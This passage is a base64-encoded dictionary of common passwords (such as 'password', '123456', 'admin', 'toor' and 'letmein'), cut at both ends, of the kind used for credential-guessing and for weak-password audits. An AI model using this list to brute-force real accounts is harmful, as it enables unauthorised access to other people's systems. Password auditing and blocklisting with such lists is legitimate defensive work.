c3MNCmd1aWRvDQpndWl0YXIxDQpndW1ieQ0KZ3VzdGF2bw0KaDJvcG9sbw0KaGFnZ2lzDQpoYWhhDQpoYWlsZXkNCmhhbA0KaGFsbG93ZWVuDQpoYWxsb3dlbGwNCmhhbWlkDQpoYW1pbHRvbg0KaGFtbGV0DQpoYW5rDQpoYW5uYQ0KaGFuc29uDQpoYXBweTEyMw0KaGFwcHlkYXkNCmhhcmRjb3JlDQpoYXJsZXkxDQpoYXJvDQpoYXJyaWV0DQpoYXJyaXMNCmhhcnZhcmQNCmhhd2sNCmhhd2tleWUxDQpoZWFsdGgNCmhlYWx0aDENCmhlYXJ0DQpoZWF0aGVyMQ0KaGVhdGhlcjINCmhlZGdlaG9nDQpoZWlra2kNCmhlbGVuZQ0KaGVsbG8xDQpoZWxsbzEyMw0KaGVsbG84DQpoZWxsb2hlbGxvDQpoZWxwMTIzDQpoZWxwZXINCmhlcm1lcw0KaGV5dGhlcmUNCmhpZ2hsYW5kDQpoaWxkYQ0KaGlsbGFyeQ0KaGlzdG9pcmUNCmhpc3RvcnkNCmhpdGxlcg0KaG9iYmVzDQpob2xpZGF5DQpob2xseQ0KaG9tZXJqDQpob25kYTENCmhvbmdrb25nDQpob29zaWVyDQpob290aWUNCmhvcGUNCmhvcnNlDQpob3NlaGVhZA0KaG90cm9kDQpodWFuZw0KaHVkc29uDQpodWdoDQpodWdvDQpodW1tZXINCmh1c2tpZXMNCmh5ZHJvZ2VuDQppDQppYjZ1YjkNCmlkaW90DQppZjZ3YXM5DQppZm9yZ2V0DQppbG1hcmkNCmlsb3ZldQ0KaW1wYWN0DQppbmRvbmVzaWENCmluZ3Zhcg0KaW5zaWdodA0KaW5zdHJ1Y3QNCmludGVncmFsDQppb21lZ2ENCmlyaW5hDQppcmlzDQppcm1lbGkNCmlzYWJlbGxlDQppc3JhZWwNCml0YWxpYQ0KaXRhbHkNCml6enkNCmowa2VyDQpqMWwydDMNCmphY2tpZTENCmphY29iDQpqYWtleQ0KamFtZXMxDQpqYW1lc2JvbmQNCmphbWllDQpqYW1qYW0NCmphbg0KamF6eg0KamVhbg0KamVkaQ0KamVlcHN0ZXINCmplZmZyZXkxDQpqZW5uaWUNCmplbm55DQpqZW5zZW4NCmplcg0KamVzc2UNCmplc3NlMQ0KamVzdGVyDQpqZXRocm8NCmpldHRhMQ0KamltYm9iDQpqaW1pDQpqaW1teQ0Kam9hbmllDQpqb2FubmENCmpvZWxsZQ0Kam9objMxNg0Kam9yZGllDQpqb3JnZQ0Kam9zZWUNCmpvc2gNCmpvdXJuZXkNCmpveQ0Kam95Y2UNCmp1YmlsZWUNCmp1aGFuaQ0KanVsZXMNCmp1bGlhMg0KanVsaWVuDQpqdWxpZXQNCmp1bWJvDQpqdW1wDQpqdW5lYnVnDQpqdW5pcGVyDQpqdXN0ZG9pdA0KanVzdGljZTQNCmthbGFtYXpvDQprYWxpDQprYXJpbg0Ka2FyaW5lDQprYXJtYQ0Ka2F0DQprYXRlDQprYXRlcmluYQ0Ka2F0aWUNCmthdGllMQ0Ka2F5bGENCmtjaW4NCmtlZXBlcg0Ka2VsbGVyDQprZW5kYWxsDQprZW5ueQ0Ka2VyYWxhDQprZXJyeWENCmtldGNodXANCmtoYW4NCmtpZHMNCmtpbmdzDQpraXNzYTINCmtpc3NtZQ0Ka2l0dGVuDQpraXR0eWNhdA0Ka2l3aQ0Ka2tra2trDQprbGVlbmV4DQprb21iYXQNCmtyaXN0aQ0Ka3Jpc3RpbmUNCmxhYjENCmxhYnRlYw0KbGFkZGllDQpsYWR5YnVnDQpsYW1lcg0KbGFuY2UNCmxhc2VyDQpsYXNlcmpldA0KbGFzc2llMQ0KbGF1cmVsDQpsYXdzb24NCmxlYWRlcg0KbGVhZg0KbGVibGFuYw0KbGVnYWwNCmxlbGFuZA0KbGVtb24NCmxlbw0KbGVzdGVyDQpsZXR0ZXINCmxldHRlcnMNCmxldg0KbGV4dXMxDQpsaWJyYQ0KbGlmZQ0KbGlnaHRzDQpsaW1hDQpsaW9uZWwNCmxpb25zDQpsaXNzYWJvbg0KbGl0dGxlDQpsaXoNCmxpenp5DQpsb2dnZXINCmxvZ29zDQpsb2lzbGFuZQ0KbG9raQ0KbG9saXRhDQpsb25lc3Rhcg0KbG9uZ2VyDQpsb25naG9ybg0KbG9vbmV5DQpsb3Jlbg0KbG9yaQ0KbG9ybmENCmxvc2VyDQpsb3N0DQpsb3R1cw0KbG91DQpsb3ZlcnMNCmxvdmV5b3UNCmx1Y2lhDQpsdWNpZmVyDQpsdWNreTE0DQptYWNoYQ0KbWFjcm9zcw0KbWFjc2UzMA0KbWFkZGllDQptYWRtYXgNCm1hZG9rYQ0KbWFnaWMxDQptYWdudW0NCm1haWRlbg0KbWFpbmUNCm1ha2VpdHNvDQptYWxsYXJkDQptYW5hZ2VtZQ0KbWFuc29uDQptYW51ZWwNCm1hcmMNCm1hcmN1cw0KbWFyaWENCm1hcmllbGxlDQptYXJpbmUNCm1hcmlubw0KbWFyc2hhbGwNCm1hcnQNCm1hcnRoYQ0KbWF0aA0KbWF0dGkxDQptYXR0aW5nbHkNCm1heG1heA0KbWVhdGxvYWYNCm1lY2gNCm1lY2hhbmljDQptZWRpY2FsDQptZWdhbg0KbWVpc3Rlcg0KbWVsaW5hDQptZW1waGlzDQptZXJjZXINCm1lcmRlDQptZXJtYWlkDQptZXJyaWxsDQptaWFtaQ0KbWljaGFsDQptaWNoZWwNCm1pY2hpZ2FuDQptaWNob3UNCm1pY2tlbA0KbWlja2V5MQ0KbWljcm9zb2Z0DQptaWR2YWxlDQptaWthZWwNCm1pbGFubw0KbWlsZXMNCm1pbGxlbml1bQ0KbWlsbGlvbg0KbWlub3UNCm1pcmFuZGENCm1pcmlhbQ0KbWlzc2lvbg0KbW1tbW1tDQptb2JpbGUNCm1vYnlkaWNrDQptb2RlbQ0KbW9qbw0KbW9ua2V5MQ0KbW9ucm9lDQptb250YW5hDQptb250YW5hMw0KbW9udHJvc2UNCm1vbnR5DQptb29tb28NCm1vb25iZWFtDQptb3JlY2F0cw0KbW9ycGhldXMNCm1vdG9yDQptb3Rvcm9sYQ0KbW92aWVzDQptb3dnbGkNCm1vemFydA0KbXVsZGVyMQ0KbXVuY2hraW4NCm11cnJheQ0KbXVzY2xlDQptdXN0YW5nMQ0KbmFkaWENCm5hZGluZQ0KbmFwb2xlb24NCm5hdGlvbg0KbmF0aW9uYWwNCm5laWwNCm5la28NCm5lc2JpdA0KbmVzdGxlDQpuZXV0cmlubw0KbmV3YWNjb3VudA0KbmV3bGlmZQ0KbmV3eW9yazENCm5leHVzNg0KbmljaG9sZQ0Kbmlja2xhdXMNCm5pZ2h0c2hhZG93DQpuaWdodHdpbmQNCm5pa2UNCm5pa2l0YQ0Kbmlra2kNCm5pbnRlbmRvDQpuaXNzZQ0Kbm9raWENCm5vbW9yZQ0Kbm9uZTENCm5vcGFzcw0Kbm9ybWFsDQpub3J0b24NCm5vdHRhMQ0Kbm91dmVhdQ0Kbm92ZWxsDQpub3dheQ0KbnVnZ2V0DQpudW1iZXI5DQpudW1iZXJzDQpudXJzZQ0KbnV0bWVnDQpvYXhhY2ENCm9iaXdhbg0Kb2JzZXNzaW9uDQpvaHNoaXQNCm9pY3U4MTINCm9tZWdhDQpvcGVudXANCm9yY2hpZA0Kb3Jlbw0Kb3JsYW5kbw0Kb3J2aWxsZQ0Kb3R0ZXINCm96enkNCnBhYWdhbA0KcGFja2FyZA0KcGFja2Vycw0KcGFja3JhdA0KcGFpbnQNCnBhbG9tYQ0KcGFtDQpwYW5jYWtlDQpwYW5pYw0KcGFwYQ0KcGFyYWRpZ20NCnBhcmsNCnBhcm9sYQ0KcGFycm90DQpwYXJ0bmVyDQpwYXNjYWwNCnBhc3MNCnBhdGNoZXMNCnBhdHJpb3RzDQpwYXVsYQ0KcGF1bGluZQ0KcGF2ZWwNCnBheXRvbg0KcGVhY2gNCnBlYW51dHMNCnBlZHJvMQ0KcGVnZ3kNCnBla2thDQpwZXJmZWN0DQpwZXJmb3JtYQ0KcGVycnkNCnBldGVyaw0KcGV0ZXJwYW4NCnBoaWFscGhhDQpwaGlsaXBzDQpwaGlsbGlwcw0KcGhpc2h5DQpwaG9uZQ0KcGlhbm8xDQpwaWFub21hbg0KcGlhbm9zDQpwaWVyY2UNCnBpZ2Vvbg0KcGluaw0KcGlvbmVlcg0KcGlwZWxpbmUNCnBpcGVyMQ0KcGlyYXRlDQpwaXNjZXMNCnBsYXRvDQpwbGF5DQpwbGF5Ym95DQpwbHV0bw0KcG9ldGljDQpwb2V0cnkNCnBvbGUNCnBvbnRpYWMNCnBvb2tleQ0KcG9wZQ0KcG9wZXllDQpwcmF5ZXINCnByZWNpb3VzDQpwcmVsdWRlDQpwcmVtaWVyDQpwcmludA0KcHJpbnRpbmcNCnByb2YNCnByb3ZpZGVyDQpwdWRkaW4NCnB1bHNhcg0KcHVzc3kNCnB1c3N5MQ0KcHlybw0KcXFxMTExDQpxdWViZWMNCnF3ZXINCnF3ZXJ0DQpxd2VydHkxMg0KcXdlcnR5dWkNCnIwZ2VyDQpyYWJiaXQxDQpyYWNlcg0KcmFjZXJ4DQpyYWNoZWxsZQ0KcmFjb29uDQpyYWRhcg0KcmFmaWtpDQpyYWxlaWdoDQpyYW0NCnJhbWJvDQpyYW5keTENCnJhc3RhMQ0KcmF0aW8NCnJhdmVucw0KcmVkY2xvdWQNCnJlZGZpc2gNCnJlZG1hbg0KcmVkc2tpbnMNCnJlZHdpbmcNCnJlZHdvb2QNCnJlZWQNCnJlZ2dhZQ0KcmVnZ2llDQpyZWxpYW50DQpyZW5lDQpyZW5lZQ0KcmVuZWdhZGUNCnJlc2N1ZQ0KcmV2b2x1dGlvbg0KcmV4DQpyZXpub3INCnJoaW5vDQpyaGpyamxiaw0KcmljaGFyZDENCnJpY2hhcmRzDQpyaWNobW9uZA0KcmlsZXkNCnJpcHBlcg0KcmlwcGxlDQpyaXRhDQpyb2JieQ0Kcm9iZXJ0cw0Kcm9ib2NvcA0Kcm9ib3RpY3MNCnJvY2hlDQpyb2NrDQpyb2NrZXQxDQpyb2NraWUNCnJvY2tvbg0Kcm9nZXIxDQpyb2dlcnMNCnJvbGFuZA0Kcm9tbWVsDQpyb25pDQpyb29raWUNCnJvb3RiZWVyDQpyb3NpZQ0Kcm9zc2lnbm8NCnJ1ZnVzDQpydWdnZXINCnJ1c2gNCnJ1c3R5DQpydXRobGVzcw0Kc2FiYmF0aA0Kc2FiaW5hDQpzYWZldHkNCnNhZmV0eTENCnNhaWdvbg0Kc2FpbnQNCnNhbUlhbQ0Kc2FtaWFtDQpzYW1taWUNCnNhbW15DQpzYW1zYW0NCnNhbmRpDQpzYW5qb3NlDQpzYXBoaXJlDQpzYXJhaDENCnNhc2tpYQ0Kc2Fzc3kNCnNhdG9yaQ0Kc2F0dXJkYXkNCnNhdHVybjUNCnNjaG5hcHBzDQpzY2llbmNlDQpzY29vYnkNCnNjb29ieWRvbw0Kc2Nvb3RlcjENCnNjb3JwaW9uDQpzY290Y2gNCnNjb3R0eQ0Kc2NvdXRzDQpzY3ViYQ0Kc2VhcmNoDQpzZWNyZXQzDQpzZWVrZXINCnNlb3VsDQpzZXB0ZW1iZXINCnNlcnZlcg0Kc2VydmljZXMNCnNldmVuNw0Kc2V4DQpzZXh5DQpzaGFnZ3kNCnNoYW5naGFpDQpzaGFubnkNCnNoYW9saW4NCnNoYXN0YQ0Kc2hheW5lDQpzaGF6YW0NCnNoZWxseQ0Kc2hlbHRlcg0Kc2hlcnJ5DQpzaGlwDQpzaGlybGV5DQpzaG9ydHkNCnNob3RndW4NCnNpZG5leQ0Kc2lnbWFjaGkNCnNpZ25hbA0Kc2lnbmF0dXJlDQpzaW1iYTENCnNpbXNpbQ0Kc2luYXRyYQ0Kc2lyaXVzDQpza2F0ZQ0Kc2tpcA0Kc2tpcHBlcjENCnNreWRpdmUNCnNreWxlcg0Kc2xheWVyDQpzbGVlcHkNCnNsaWNrDQpzbGlkZXINCnNsaXANCnNtZWdtYQ0Kc21pbGUxDQpzbWl0aHMNCnNtaXR0eQ0Kc21va2UNCnNtdXJmeQ0Kc25ha2VzDQpzbmFwcGVyDQpzbm9vcA0Kc25vdw0Kc29iZXIxDQpzb2xvbW9uDQpzb25pY3MNCnNvbnkNCnNvcGhpYQ0Kc3BhY2UNCnNwYXJrcw0Kc3BhcnRhbg0Kc3BhenoNCnNwaHlueA0Kc3Bpa2UxDQpzcG9jaw0Kc3BvbmdlDQpzcG9vbg0Kc3BvdA0Kc3Byb2NrZXQNCnNwdXJzDQpzcXVhc2gNCnN0YW4NCnN0YXJidWNrDQpzdGFyZ2F0ZQ0Kc3RhcmxpZ2h0DQpzdGFycw0Kc3RlZWwNCnN0ZXBoMQ0Kc3RlcGhpDQpzdGV2ZTENCnN0ZXZlbnMNCnN0ZXdhcnQNCnN0aW5nDQpzdGl2ZXJzDQpzdG9ja3MNCnN0b25lDQpzdG9yYWdlDQpzdHJhbmdlcg0Kc3RyYXQNCnN0cmF0bw0Kc3RyZXRjaA0Kc3Ryb25nDQpzdHVkDQpzdHVkZW50Mg0Kc3R1ZGlvDQpzdHVtcHkNCnN1Y2tlcg0Kc3Vja21lDQpzdWUNCnN1bHRhbg0Kc3VtbWl0DQpzdW5maXJlDQpzdW5zZXQNCnN1cGVyDQpzdXBlcnN0YXINCnN1cmZpbmcNCnN1c2FuMQ0Kc3VzYW5uYQ0Kc3V0dG9uDQpzdXp5DQpzd2Fuc29uDQpzd2VkZW4NCnN3ZWV0cGVhDQpzd2VldHkNCnN3aW0NCnN3aXR6ZXINCnN3b3JkZmlzaA0Kc3lzdGVtNQ0KdC1ib25lDQp0YWINCnRhYmF0aGENCnRhY29iZWxsDQp0YWl3YW4NCnRhbG9uDQp0YW10YW0NCnRhbm5lcg0KdGFwYW5pDQp0YXJnYXMNCnRhcmdldA0KdGFyaGVlbA0KdGFzaGENCnRhdGENCnRhdHRvbw0KdGF6ZGV2aWwNCnRlcXVpbGENCnRlcnJ5MQ0KdGVzdDINCnRlc3QzDQp0ZXN0ZXINCnRlc3RpDQp0ZXN0dGVzdA0KdGV4YXMNCnRoYW5reW91DQp0aGVlbmQNCnRoZWxvcmF4DQp0aGlzaXNpdA0KdGhvbXBzb24NCnRob3JuZQ0KdGhyYXNoZXINCnRpZ2VyMg0KdGlnaHRlbmQNCnRpa2ENCnRpbQ0KdGltYmVyDQp0aW1vdGh5DQp0aW5rZXJiZWxsDQp0bnQNCnRvbQ0KdG9vbA0KdG9wY2F0DQp0b3BoZXINCnRvc2hpYmENCnRvdGFsDQp0b3RvMQ0KdG90b3RvDQp0b3VjYW4NCnRyYW5zZmVyDQp0cmFuc2l0DQp0cmFuc3BvcnQNCnRyYXBwZXINCnRyYXNoDQp0cmF2aXMNCnRyZQ0KdHJlYXN1cmUNCnRyZWVzDQp0cmlja3kNCnRyaXNoDQp0cml0b24NCnRyb21ib25lDQp0cm9waHkNCnRyb3VibGUNCnRydWNrZXINCnR1Y3Nvbg0KdHVsYQ0KdHVyYm8NCnR1cmJvMg0KdHdpbnMNCnR5bGVyMQ0KdWx0aW1hdGUNCnVuaXF1ZQ0KdW5pdGVkDQp1bml0eQ0KdW5peA0KdXBzaWxvbg0KdXJzdWxhDQp1c2VyMQ0KdmFjYXRpb24NCnZhbGxleQ0KdmFtcGlyZQ0KdmFuZXNzYQ0KdmVkZGVyDQp2ZWxvDQp2ZW5pY2UNCnZlbnVzDQp2ZXJtb250DQp2ZXR0ZQ0Kdmlja2kNCnZpY2t5DQp2aWN0b3IxDQp2aWtyYW0NCnZpbmNlbnQxDQp2aW9sZXQNCnZpb2xpbg0KdmlyYWdvDQp2aXJnaWwNCnZpcmdpbmlhDQp2aXNpb24NCnZpc3VhbA0Kdm9sY2Fubw0Kdm9sbGV5DQp2b29kb28NCnZvcnRleA0Kd2FpdGluZw0Kd2FsZGVuDQp3YWxkbw0Kd2FsbGV5ZQ0Kd2Fua2VyDQp3YXJuZXINCndhdGVyMQ0Kd2F5bmUxDQp3ZWJtYXN0ZXINCndlYnN0ZXINCndlZGdlDQp3ZWV6ZXINCndlbmR5MQ0Kd2VzdGVybg0Kd2hhbGUxDQp3aGl0DQp3aGl0ZQ0Kd2hpdG5leQ0Kd2hvY2FyZXMNCndob3ZpbGxlDQp3aWJibGUNCndpbGRjYXQNCndpbGwNCndpbGxpYW0xDQp3aWxtYQ0Kd2luZA0Kd2luZG93DQp3aW5uaWV0aGVwb29oDQp3b2xmZ2FuZw0Kd29sdmVyaW5lDQp3b21iYXQxDQp3b25kZXINCndvcmQNCndvcmxkDQp4LWZpbGVzDQp4LW1lbg0KeGFudGgNCnh4eDEyMw0KeHh4eHh4eHgNCnh5eg0KeWFtYWhhDQp5YW5rZWUNCnlvZ2liZWFyDQp5b2xhbmRhDQp5b21hbWENCnl2ZXR0ZQ0KemFjaGFyeQ0KemFjaw0KemVicmFzDQp6ZXBwbGluDQp6b2x0YW4NCnpvb21lcg0KenhjDQp6eGN2Ym4NCiFAIyQlXiYNCjAwMDAwMDAwDQoxMjEyMTINCjEyMzRxd2VyDQoxMjNnbw0KMTMxMzEzDQoxMzU3OQ0KMTcwMWQNCjIxMTIyMTEyDQozNjkNCjU1NTUNCjgwNDg2DQo5MDIxMA0KOTExDQo5OTk5OTk5OQ0KQCMkJV4mDQpBQkMxMjMNCkFiY2RlZg0KQXNkZmdoDQpDYXNpbw0KQ2hhbmdlbWUNCkZ1Y2tZb3UNCkZ1Y2t5b3UNCkdpem1vDQpIZWxsbw0KSlNCYWNoDQpNaWNoZWwNCk5DQzE3MDENClBQUA0KUXdlcnQNClF3ZXJ0eQ0KV2luZG93cw0KWnhjdmINClp4Y3Zibm0NCmFjdGlvbg0KYWR2aWwNCmFsbG8NCmFtZWxpZQ0KYW5hY29uZGENCmFuZ3VzDQphcG9sbG8xMw0KYXJ0aXN0DQphc3Blbg0KYXNzDQphc3Nob2xlDQphdGgNCmJlbm9pdA0KYmVybmFyZA0KYmVybmllDQpiaWdiaXJkDQpiaXJkDQpibGl6emFyZA0KYmx1ZXNreQ0KYm9uam91cg0KYm9vc3Rlcg0KYnl0ZW1lDQpjYWVzYXINCmNhcmRpbmFsDQpjYXJvbGluYQ0KY2F0cw0KY2VkaWMNCmNlc2FyDQpjaGFuZGxlcg0KY2hhbmdlaXQNCmNoYXBtYW4NCmNoYXJsaWUxDQpjaGV2eQ0KY2hpcXVpdGENCmNob2NvbGF0DQpjaHJpc3RpYQ0KY2hyaXN0b3BoDQpjbGFzc3Jvb20NCmNsb2Nsbw0KY29jbw0KY29ycmFkbw0KY291Z2Fycw0KY291cnRuZXkNCmRhc2hhDQpkZW1vDQpkaXJrDQpkb2xwaGlucw0KZG9taW5pYw0KZG9ua2V5DQpkb29tMg0KZHVzdHkNCmUNCmVuZXJneQ0KZmVhcmxlc3MNCmZpY3Rpb24NCmZvcmVzdA0KZnJlbmNoMQ0KZnViYXINCmdhdG9yDQpnaWxsZXMNCmdsZW5uDQpnbw0KZ29jb3Vncw0KZ29vZC1sdWNrDQpncmF5bWFpbA0KZ3Vpbm5lc3MNCmhpbGJlcnQNCmhvbGENCmhvbWUNCmhvbWVicmV3DQpob3Rkb2cNCmluZGlhbg0KamFyZWQNCmppbWJvDQpqa20NCmpvaG5zb24NCmpvam8NCmpvc2llDQpqdWR5DQprb2tvDQprcmlzdGluDQpsbG95ZA0KbG9ycmFpbmUNCmx1bHUNCmx5bm4NCm0xOTExYTENCm1hYw0KbWFjaW50b3NoDQptYWlsZXINCm1hcnMNCm1heGltZQ0KbWVtb3J5DQptZW93DQptaW1pDQptaXJyb3INCm5hdA0KbmUxNDEwcw0KbmUxNDY5DQpuZTE0YTY5DQpuZWJyYXNrYQ0KbmVtZXNpcw0KbmV0d29yaw0KbmV3Y291cnQNCm5pZ2VsDQpuaWtpDQpuaXRlDQpub3R1c2VkDQpvYXRtZWFsDQpwYXR0b24NCnBhdWwNCnBlZHJvDQpwbGFuZXQNCnBsYXllcnMNCnBvbGl0aWNzDQpwb21tZQ0KcG9ydGxhbmQNCnByYWlzZQ0KcHJvcGVydHkNCnByb3RlbA0KcHNhbG1zDQpxd2FzengNCnJhaWRlcnMNCnJhbWJvMQ0KcmFuY2lkDQpydXRoDQpzYWxlcw0Kc2FsdXQNCnNjcm9vZ2UNCnNoYXduDQpzaGVsbGV5DQpza2lkb28NCnNvZnRiYWxsDQpzcGFpbg0Kc3BlZWRvDQpzcG9ydHMNCnNzcw0Kc3Nzc3NzDQpzdGVlbGUNCnN0ZXBoDQpzdGVwaGFuaQ0Kc3VuZGF5DQpzdXJmDQpzeWx2aWUNCnN5bWJvbA0KdGlmZmFueQ0KdGlncmUNCnRvcm9udG8NCnRyaXhpZQ0KdW5kZWFkDQp2YWxlbnRpbg0KdmVsdmV0DQp2aWtpbmcNCndhbGtlcg0Kd2F0c29uDQp5b3VuZw0KemhvbmdndW8NCm15c3BhY2UxDQpibGluazE4Mg0KY2hhbmdlbWUgDQpwYXNzd29yZA0Kc3RhcnQNCmNvbXB1dGVyDQppbnRlcm5ldA0KaWhhdmVubw0KcGFzcw0KZ29kYmxlc3N5b3UNCmFkbWluaXN0cmF0b3INCmdvYmx1ZQ0KMTIzMTIzDQoxMjM0NTYNCjEyMzQ1NjcNCjEyMzQ1Njc4DQoxMjM0NTY3ODkNCjE1OTE1OQ0KMTEyMjMzDQozMzIyMTENCjE0Nzg5NjMNCjE0Nzg5NjMuDQpjcGFuZWwNCnBhc3N3b3JkDQp1c2VyDQpwYXNzd2QNCnBhc3N3b3Jkcw0KMTU5MzU3DQozNTc5NTENCjExNDQ3Nw0KcGFzcw0KUGFzc3dvcmQNCjEyMzQ1DQowMDAwDQpyb290DQp0b29yDQphZG1pbg0KYXlhbTEyMw0KZ3VybGd1cmwNCmJveWFuZGdpcmwNCm1hcmlhb3phd2ENCmhpdG9taXRhbmFrYQ0Ka2lsbGVyDQphY2Nlc3NhZG1pbg0KZmlsbHRoZWZvcm0NCnBhc3N3b3JkczEyMw0KcGFzc3dvcmRzMDk4DQpwYXNzd29yZHMxMjM0NTY3ODkwDQpwYXNzd29yZHMwOTg3NjU0MzIxDQpxd2Vhc2R6eGMNCnF3ZXJ0eXVpb3ANCmFzZGZnaGprbA0KenhjdmJubQ0KQGRtaW4NCkBkbWluMTIzDQpAZG1pbjA5ODc2NTQzMjENCkFETUlODQpQQVNTV09SRA0KYWRtaW5pc3RyYXRvcg0KYWRtaW5pc3RyYXRpb24NCmFkbWluDQo0ZG0xbg0KcDRzc3cwcmQNCnA0NTV3MHJkDQphZG1pbnMNCmlkYWRtaW4NCmFkbWluMTIzNDUNCmFkbWluDQoxMjM0NTYNCnBhc3N3b3JkDQoxMDIwMzANCjEyMzEyMw0KMTIzNDUNCjEyMzQ1Njc4OQ0KcGFzcw0KdGVzdA0KYWRtaW4xMjMNCmRlbW8NCiFAIyQlXg0KcGFzcw0KcHdkDQpwc3N3b2QNCjEyMzQ1Ng0KMTIzNDU2NzgNCjEyMzQNCnF3ZXJ0eQ0KMTIzNDUNCmRyYWdvbg0KcHVzc3kNCmJhc2ViYWxsDQpmb290YmFsbA0KbGV0bWVpbg0KbW9ua2V5DQo2OTY5NjkNCmFiYzEyMw0KbXVzdGFuZw0KbWljaGFlbA0Kc2hhZG93DQptYXN0ZXINCmplbm5pZmVyDQoxMTExMTENCjIwMDANCmpvcmRhbg0Kc3VwZXJtYW4NCmhhcmxleQ0KMTIzNDU2Nw0KZnVja21lDQpodW50ZXINCmZ1Y2t5b3UNCnRydXN0bm8xDQpyYW5nZXINCmJ1c3Rlcg0KdGhvbWFzDQp0aWdnZXINCnJvYmVydA0Kc29jY2VyDQpmdWNrDQpiYXRtYW4NCnRlc3QNCnBhc3MNCmtpbGxlcg0KaG9ja2V5DQpnZW9yZ2UNCmNoYXJsaWUNCmFuZHJldw0KbWljaGVsbGUNCmxvdmUNCnN1bnNoaW5lDQpqZXNzaWNhDQphc3Nob2xlDQo2OTY5DQpwZXBwZXINCmRhbmllbA0KYWNjZXNzDQoxMjM0NTY3ODkNCjY1NDMyMQ0Kam9zaHVhDQptYWdnaWUNCnN0YXJ3YXJzDQpzaWx2ZXINCndpbGxpYW0NCmRhbGxhcw0KeWFua2Vlcw0KMTIzMTIzDQphc2hsZXkNCjY2NjY2Ng0KaGVsbG8NCmFtYW5kYQ0Kb3JhbmdlDQpiaXRlbWUNCmZyZWVkb20NCmNvbXB1dGVyDQpzZXh5DQp0aHVuZGVyDQpuaWNvbGUNCmdpbmdlcg0KaGVhdGhlcg0KaGFtbWVyDQpzdW1tZXINCmNvcnZldHRlDQp0YXlsb3INCmZ1Y2tlcg0KYXVzdGluDQoxMTExDQptZXJsaW4NCm1hdHRoZXcNCjEyMTIxMg0KZ29sZmVyDQpjaGVlc2UNCnByaW5jZXNzDQptYXJ0aW4NCmNoZWxzZWENCnBhdHJpY2sNCnJpY2hhcmQNCmRpYW1vbmQNCnllbGxvdw0KYmlnZG9nDQpzZWNyZXQNCmFzZGZnaA0Kc3Bhcmt5DQpjb3dib3kNCmNhbWFybw0KYW50aG9ueQ0KbWF0cml4DQpmYWxjb24NCmlsb3ZleW91DQpiYWlsZXkNCmd1aXRhcg0KamFja3Nvbg0KcHVycGxlDQpzY29vdGVyDQpwaG9lbml4DQphYWFhYWENCm1vcmdhbg0KdGlnZXJzDQpwb3JzY2hlDQptaWNrZXkNCm1hdmVyaWNrDQpjb29raWUNCm5hc2Nhcg0KcGVhbnV0DQpqdXN0aW4NCjEzMTMxMw0KbW9uZXkNCmhvcm55DQpzYW1hbnRoYQ0KcGFudGllcw0Kc3RlZWxlcnMNCmpvc2VwaA0Kc25vb3B5DQpib29tZXINCndoYXRldmVyDQppY2VtYW4NCnNtb2tleQ0KZ2F0ZXdheQ0KZGFrb3RhDQpjb3dib3lzDQplYWdsZXMNCmNoaWNrZW4NCmRpY2sNCmJsYWNrDQp6eGN2Ym4NCnBsZWFzZQ0KYW5kcmVhDQpmZXJyYXJpDQprbmlnaHQNCmhhcmRjb3JlDQptZWxpc3NhDQpjb21wYXENCmNvZmZlZQ0KYm9vYm9vDQpiaXRjaA0Kam9obm55DQpidWxsZG9nDQp4eHh4eHgNCndlbGNvbWUNCmphbWVzDQpwbGF5ZXINCm5jYzE3MDENCndpemFyZA0Kc2Nvb2J5DQpjaGFybGVzDQpqdW5pb3INCmludGVybmV0DQpiaWdkaWNrDQptaWtlDQpicmFuZHkNCnRlbm5pcw0KYmxvd2pvYg0KYmFuYW5hDQptb25zdGVyDQpzcGlkZXINCmxha2Vycw0KbWlsbGVyDQpyYWJiaXQNCmVudGVyDQptZXJjZWRlcw0KYnJhbmRvbg0Kc3RldmVuDQpmZW5kZXINCmpvaG4NCnlhbWFoYQ0KZGlhYmxvDQpjaHJpcw0KYm9zdG9uDQp0aWdlcg0KbWFyaW5lDQpjaGljYWdvDQpyYW5nZXJzDQpnYW5kYWxmDQp3aW50ZXINCmJpZ3RpdHMNCmJhcm5leQ0KZWR3YXJkDQpyYWlkZXJzDQpwb3JuDQpiYWRib3kNCmJsb3dtZQ0Kc3Bhbmt5DQpiaWdkYWRkeQ0Kam9obnNvbg0KY2hlc3Rlcg0KbG9uZG9uDQptaWRuaWdodA0KYmx1ZQ0KZmlzaGluZw0KMDAwMDAwDQpoYW5uYWgNCnNsYXllcg0KMTExMTExMTENCnJhY2hlbA0Kc2V4c2V4DQpyZWRzb3gNCnRoeDExMzgNCmFzZGYNCm1hcmxib3JvDQpwYW50aGVyDQp6eGN2Ym5tDQphcnNlbmFsDQpvbGl2ZXINCnFhendzeA0KbW90aGVyDQp2aWN0b3JpYQ0KNzc3Nzc3Nw0KamFzcGVyDQphbmdlbA0KZGF2aWQNCndpbm5lcg0KY3J5c3RhbA0KZ29sZGVuDQpidXR0aGVhZA0KdmlraW5nDQpqYWNrDQppd2FudHUNCnNoYW5ub24NCm11cnBoeQ0KYW5nZWxzDQpwcmluY2UNCmNhbWVyb24NCmdpcmxzDQptYWRpc29uDQp3aWxzb24NCmNhcmxvcw0KaG9vdGVycw0Kd2lsbGllDQpzdGFydHJlaw0KY2FwdGFpbg0KbWFkZG9nDQpqYXNtaW5lDQpidXR0ZXINCmJvb2dlcg0KYW5nZWxhDQpnb2xmDQpsYXVyZW4NCnJvY2tldA0KdGlmZmFueQ0KdGhlbWFuDQpkZW5uaXMNCmxpdmVycG9vDQpmbG93ZXINCmZvcmV2ZXINCmdyZWVuDQpqYWNraWUNCm11ZmZpbg0KdHVydGxlDQpzb3BoaWUNCmRhbmllbGxlDQpyZWRza2lucw0KdG95b3RhDQpqYXNvbg0Kc2llcnJhDQp3aW5zdG9uDQpkZWJiaWUNCmdpYW50cw0KcGFja2Vycw0KbmV3eW9yaw0KamVyZW15DQpjYXNwZXINCmJ1YmJhDQoxMTIyMzMNCnNhbmRyYQ0KbG92ZXJzDQptb3VudGFpbg0KdW5pdGVkDQpjb29wZXINCmRyaXZlcg0KdHVja2VyDQpoZWxwbWUNCmZ1Y2tpbmcNCnBvb2tpZQ0KbHVja3kNCm1heHdlbGwNCjg2NzUzMDkNCmJlYXINCnN1Y2tpdA0KZ2F0b3JzDQo1MTUwDQoyMjIyMjINCnNoaXRoZWFkDQpmdWNrb2ZmDQpqYWd1YXINCm1vbmljYQ0KZnJlZA0KaGFwcHkNCmhvdGRvZw0KdGl0cw0KZ2VtaW5pDQpsb3Zlcg0KeHh4eHh4eHgNCjc3Nzc3Nw0KY2FuYWRhDQpuYXRoYW4NCnZpY3Rvcg0KZmxvcmlkYQ0KODg4ODg4ODgNCm5pY2hvbGF